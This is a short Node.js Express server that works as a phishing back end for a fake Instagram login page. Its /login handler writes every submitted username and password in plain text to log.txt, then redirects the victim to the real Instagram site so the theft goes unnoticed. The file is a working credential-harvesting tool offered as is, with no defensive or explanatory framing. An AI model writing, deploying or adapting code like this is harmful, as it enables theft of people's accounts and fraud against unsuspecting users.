const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();
const port = process.env.PORT || 10000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const log = `Username: ${username}, Password: ${password}\n`;

  fs.appendFile('log.txt', log, (err) => {
    if (err) {
      console.error('Error saving credentials:', err);
    }
  });

  // Optional: redirect to real Instagram or show an error
  res.redirect('https://instagram.com');
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
